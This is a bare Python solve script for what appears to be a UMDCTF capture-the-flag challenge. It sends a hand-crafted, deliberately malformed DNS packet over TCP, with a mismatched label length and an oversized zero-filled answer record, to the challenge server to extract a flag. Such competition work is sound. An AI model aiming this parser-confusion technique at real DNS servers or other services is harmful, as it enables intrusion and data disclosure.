#!/bin/python3

import socket, struct
from dnslib import DNSRecord, DNSQuestion, DNSHeader, QTYPE

def recvall(self, length):
    received = 0
    res = b''
    while received < length:
        res += self.recv(length - received)
        received = len(res)
    return res

socket.socket.recvall = recvall

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect(("challs.umdctf.io", 32324))

    header = struct.pack(
        "!HHHHHH", # 6 shorts or 12 bytes
        0x0001,    # ID (Can be anything)
        0x0000,    # FLAGS
        1,         # QDCOUNT (1 Question)
        1,         # ANCOUNT (0 Answers)
        0,         # NSCOUNT (0 NS RRs)
        0,         # ARCOUNT (0 Additional Records)
    )

    flag = b'flag'
    market = b'market'
    poly = 'polȳ'.encode('utf8')
    qname = len(flag).to_bytes(1) + flag + len(market).to_bytes(1) + market + b'\x03' + poly
    question = struct.pack(
        "!{}sHH".format(len(qname)),
        qname,
        16,
        1
    )

    length = 2183
    answer = struct.pack(
        "!cHHIH{}s".format(length),
        b'\x00',
        16,
        1,
        0,
        length,
        b'\x00' * length
    )

    payload = header + question + answer
    sock.sendall(len(payload).to_bytes(2) + payload)

    resp_len = sock.recv(2)
    resp_len = int.from_bytes(resp_len)
    resp = sock.recvall(resp_len)

    print(DNSRecord.parse(resp))
